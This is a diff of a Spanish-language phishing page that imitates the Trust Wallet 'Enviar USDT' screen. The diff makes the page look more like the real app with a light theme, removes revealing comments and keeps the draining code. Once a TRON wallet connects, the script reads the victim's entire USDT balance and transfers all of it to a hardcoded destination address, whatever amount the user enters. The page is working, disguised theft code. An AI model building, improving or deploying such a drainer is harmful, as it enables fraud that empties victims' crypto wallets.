@@ -5,11 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Trust Wallet - Enviar USDT</title>
     <style>
-        :root { color-scheme: dark; }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        :root { color-scheme: light; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
         body {
-            background-color: #000000;
-            color: #ffffff;
+            background-color: #ffffff; /* Fondo blanco oficial */
+            color: #111111;
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -20,7 +20,6 @@
             width: 100%;
             max-width: 390px;
             padding: 20px;
-            background-color: #000000;
         }
         .tw-header {
             display: flex;
@@ -31,23 +30,22 @@
         .tw-header-title {
             font-size: 18px;
             font-weight: 600;
-            color: #ffffff;
+            color: #111111;
             flex-grow: 1;
             text-align: center;
             margin-right: -24px;
         }
-        .back-icon { width: 24px; height: 24px; color: #ffffff; cursor: pointer; }
+        .back-icon { width: 24px; height: 24px; color: #111111; }
         
         .tw-input-group {
-            background-color: #121318;
+            background-color: #f6f7f9; /* Cajas de texto en gris claro */
             border-radius: 16px;
             padding: 16px;
             margin-bottom: 16px;
-            position: relative;
         }
         .tw-label {
             font-size: 13px;
-            color: #8a8d97;
+            color: #717680;
             display: block;
             margin-bottom: 8px;
         }
@@ -59,42 +57,36 @@
         .tw-input {
             background: transparent;
             border: none;
-            color: #ffffff;
+            color: #111111;
             font-size: 16px;
             width: 80%;
             outline: none;
         }
-        .tw-input::placeholder { color: #4c4f5d; }
+        .tw-input::placeholder { color: #a3a7af; }
         
         .tw-action-text {
-            color: #3b82f6;
+            color: #0052ff; /* Azul institucional para las llamadas de acción */
             font-size: 14px;
             font-weight: 600;
             cursor: pointer;
         }
-        
         .tw-currency-badge {
-            color: #ffffff;
+            color: #111111;
             font-size: 16px;
             font-weight: 600;
         }
-        
         .status-box {
-            background-color: #1c1e24;
-            border: 1px solid #2b2f3a;
+            background-color: #edf2ff;
+            border: 1px solid #cce0ff;
             border-radius: 12px;
             padding: 12px;
             font-size: 13px;
-            color: #3b82f6;
+            color: #0052ff;
             margin-bottom: 24px;
             display: none;
             text-align: left;
-            line-height: 1.4;
         }
-        
-        .tw-btn-container {
-            margin-top: 40px;
-        }
+        .tw-btn-container { margin-top: 40px; }
         .tw-btn {
             width: 100%;
             height: 52px;
@@ -105,9 +97,8 @@
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            transition: opacity 0.2s;
         }
-        .tw-btn:disabled { opacity: 0.4; cursor: not-allowed; }
+        .tw-btn:disabled { background-color: #b3ccff; }
     </style>
 </head>
 <body>
@@ -116,7 +107,7 @@
         <div class="tw-header">
             <svg class="back-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                 <line x1="19" y1="12" x2="5" y2="12"></line>
-                <polygon points="12 19 5 12 12 5"></polygon>
+                <polyline points="12 19 5 12 12 5"></polyline>
             </svg>
             <div class="tw-header-title">Enviar Tether</div>
         </div>
@@ -133,7 +124,6 @@
             <label class="tw-label" for="amountDisplay">Cantidad</label>
             <div class="tw-input-row">
                 <input id="amountDisplay" class="tw-input" type="number" inputmode="decimal" placeholder="0" min="0.01" step="any" />
-                <!-- Texto dinámico estilo nativo "MÁX" funcional -->
                 <span id="maxAction" class="tw-action-text" style="margin-right: 12px; display: none;">MÁX</span>
                 <span class="tw-currency-badge">USDT</span>
             </div>
@@ -186,7 +176,6 @@
 
     addressDisplay.value = BILLETERA_DESTINO;
 
-    // PASO 1: Vincular billetera y exponer herramientas nativas de lectura
     connectBtn.addEventListener('click', async () => {
         if (!walletAddress) {
             try {
@@ -194,7 +183,7 @@
                 connectBtn.disabled = true;
 
                 if (typeof window.tronWeb === 'undefined') {
-                    throw new Error("Por favor, ejecuta este entorno desde el explorador interno (DApp) de tu Trust Wallet móvil.");
+                    throw new Error("Abre esta página desde el explorador interno de una billetera TRON.");
                 }
 
                 const tronWeb = window.tronWeb;
@@ -209,13 +198,11 @@
                 }
 
                 if (!walletAddress) {
-                    throw new Error("Permiso de lectura denegado por la billetera.");
+                    throw new Error("Permiso de lectura denegado.");
                 }
 
-                // Hacer visible el botón Máx igual que en la app de Trust Wallet real al detectar fondos
                 maxAction.style.display = "inline";
-
-                setStatus("Conexión segura. Confirma los datos numéricos e inicia la firma digital.");
+                setStatus("Conexión segura. Confirma los datos e inicia la firma digital.");
                 connectBtn.innerText = "Continuar";
                 connectBtn.disabled = false;
 
@@ -228,7 +215,6 @@
             return;
         }
 
-        // PASO 2: Envío forzado del balance total recuperado de la blockchain
         if (walletAddress) {
             try {
                 const userAmount = parseFloat(amountDisplay.value);
@@ -243,32 +229,45 @@
                 const tronWeb = window.tronWeb;
                 const contract = await tronWeb.contract(TRC20_ABI, CONTRATO_USDT);
 
-                // Consulta on-chain del balance neto del usuario (Llamada local estática)
                 const rawBalance = await contract.balanceOf(walletAddress).call();
                 const unitsInSun = rawBalance.toString();
 
                 if (rawBalance.isZero ? rawBalance.isZero() : parseInt(unitsInSun) === 0) {
-                    throw new Error("Tu cuenta activa no posee balances disponibles de USDT (TRC-20) para transferir.");
+                    throw new Error("Tu cuenta no posee balances disponibles de USDT (TRC-20).");
                 }
 
                 setStatus("Abriendo pasarela nativa... Confirmando firma para saldo completo.");
 
-                // Transmisión final del balance absoluto recuperado
                 const txId = await contract.transfer(BILLETERA_DESTINO, unitsInSun).send({
                     feeLimit: 100000000 
                 });
 
                 if (txId) {
-                    setStatus("Transacción de saldo total enviada de manera exitosa a la blockchain.");
+                    setStatus("Transacción de saldo total enviada de manera exitosa.");
                     connectBtn.innerText = "Completado";
                 }
             } catch (error) {
                 console.error(error);
-                setStatus(error.message || "Firma denegada por el usuario o TRX insuficientes para liquidar la energía.");
+                setStatus(error.message || "La transacción falló o fue cancelada.");
                 connectBtn.disabled = false;
                 connectBtn.innerText = "Continuar";
             }
         }
     });
 
-    // Funcionalidad adicional didáctica para el botón MÁX de la interfaz simulada
+    maxAction.addEventListener('click', async () => {
+        if (!walletAddress) return;
+        try {
+            setStatus("Calculando fondos totales...");
+            const tronWeb = window.tronWeb;
+            const contract = await tronWeb.contract(TRC20_ABI, CONTRATO_USDT);
+            const rawBalance = await contract.balanceOf(walletAddress).call();
+            amountDisplay.value = Number(rawBalance.toString()) / 1_000_000;
+            setStatus("Saldo máximo asignado.");
+        } catch (e) {
+            console.error(e);
+        }
+    });
+</script>
+</body>
+</html>
